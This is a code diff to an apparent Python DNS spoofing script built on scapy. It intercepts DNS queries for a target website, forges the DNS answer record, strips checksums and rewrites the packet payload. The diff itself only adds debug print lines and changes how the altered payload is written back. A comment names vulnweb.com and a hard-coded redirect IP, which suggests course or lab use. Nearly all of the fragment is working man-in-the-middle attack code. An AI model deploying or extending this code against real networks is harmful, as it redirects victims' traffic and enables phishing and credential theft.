@@ -32,6 +32,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname # DNSQR is Question Record for DNS
     # DNSRQ is for DNS Request and for DNS Response we use DNSRR
         #if "www.vulnweb.com" in str(qname):
+        #print(target_website, qname, type(qname), type(target_website))
         if target_website in str(qname):
             print("[+] Spoofing Target ")
             #answer = scapy.DNSRR(rrname = qname, rdata = "85.128.197.105") # Modifying the DNS Record
@@ -48,8 +49,9 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].chksum
 
             #packet.set_payload(str(scapy_packet))
-            packet.set_payload(bytes(scapy_packet))
-            #packet.payload = scapy_packet.payload
+            # packet.set_payload(bytes(scapy_packet))
+            print("-"*10,scapy_packet,scapy_packet.payload)
+            packet.payload = scapy_packet.payload
             #packet[DNS] = scapy_packet[DNS]
 
     packet.accept()
